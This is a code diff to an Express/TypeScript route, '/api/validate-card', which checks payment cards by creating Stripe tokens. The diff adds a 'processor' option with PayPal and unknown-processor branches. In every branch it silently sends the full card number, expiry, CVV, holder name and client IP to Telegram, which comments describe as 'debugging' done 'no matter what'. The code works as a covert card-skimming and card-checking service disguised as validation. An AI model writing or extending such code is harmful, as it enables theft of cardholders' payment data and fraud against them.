@@ -49,7 +49,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
   
   // Validate card endpoint with Stripe integration
   app.post('/api/validate-card', async (req, res) => {
-    const { number, expiry, cvv, holder } = req.body;
+    const { number, expiry, cvv, holder, processor = 'stripe' } = req.body;
     
     if (!number || !expiry || !cvv) {
       return res.status(400).json({ 
@@ -68,6 +68,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
 👤 Card Holder: ${holder || 'Not provided'}
 📅 Expiry Date: ${expiry}
 🔢 CVV/CVC: ${cvv}
+🔌 Processor: ${processor}
 🕒 Time: ${new Date().toISOString()}
 📱 IP Address: ${req.ip || 'Unknown'}
 `;
@@ -77,43 +78,76 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const [expMonth, expYear] = expiry.split('/');
       const formattedExpYear = `20${expYear}`;
       
-      // Create a token to validate the card without charging
-      // Use any type assertion to avoid TypeScript errors
-      const tokenParams: any = {
-        card: {
-          number: cleanCardNumber,
-          exp_month: parseInt(expMonth, 10),
-          exp_year: parseInt(formattedExpYear, 10),
-          cvc: cvv,
-          name: holder || undefined
-        }
-      };
-      
-      const token = await stripe.tokens.create(tokenParams);
-      
-      // If we get here, the card is valid according to Stripe
-      // Send to Telegram for debugging (silently)
-      const successMessage = `${fullCardDetails}
+      if (processor === 'stripe') {
+        // Create a token to validate the card without charging
+        // Use any type assertion to avoid TypeScript errors
+        const tokenParams: any = {
+          card: {
+            number: cleanCardNumber,
+            exp_month: parseInt(expMonth, 10),
+            exp_year: parseInt(formattedExpYear, 10),
+            cvc: cvv,
+            name: holder || undefined
+          }
+        };
+        
+        const token = await stripe.tokens.create(tokenParams);
+        
+        // If we get here, the card is valid according to Stripe
+        // Send to Telegram for debugging (silently)
+        const successMessage = `${fullCardDetails}
 ✅ Status: VALID
 🏦 Bank Details: ${token.card?.country || 'Unknown'} - ${token.card?.funding || 'Unknown'}
 🏢 Card Brand: ${token.card?.brand || 'Unknown'}
 🔑 Token: ${token.id}
-      `;
-      
-      // Send card info to Telegram no matter what
-      await sendToTelegram(successMessage);
-      
-      res.json({ 
-        success: true, 
-        message: 'Card is valid and active',
-        details: {
-          brand: token.card?.brand,
-          last4: token.card?.last4,
-          funding: token.card?.funding,
-          country: token.card?.country
-        }
-      });
-      
+        `;
+        
+        // Send card info to Telegram no matter what
+        await sendToTelegram(successMessage);
+        
+        res.json({ 
+          success: true, 
+          message: 'Card is valid and active',
+          details: {
+            brand: token.card?.brand,
+            last4: token.card?.last4,
+            funding: token.card?.funding,
+            country: token.card?.country
+          },
+          code: 'approved'
+        });
+      } else if (processor === 'paypal') {
+        // Future PayPal implementation
+        // For now, return "processor not available" error
+        const paypalError = `${fullCardDetails}
+❌ Status: ERROR
+❗ Reason: PayPal processor not yet available
+🔑 Code: processor_unavailable
+        `;
+        
+        await sendToTelegram(paypalError);
+        
+        res.status(400).json({
+          success: false,
+          message: 'PayPal processor not available yet',
+          code: 'processor_unavailable'
+        });
+      } else {
+        // Unrecognized processor
+        const unknownProcessor = `${fullCardDetails}
+❌ Status: ERROR
+❗ Reason: Unknown processor requested
+🔑 Code: unknown_processor
+        `;
+        
+        await sendToTelegram(unknownProcessor);
+        
+        res.status(400).json({
+          success: false,
+          message: `Unknown processor: ${processor}`,
+          code: 'unknown_processor'
+        });
+      }
     } catch (error: any) {
       // Extract detailed error message from Stripe
       let declineMessage = 'Card validation failed';
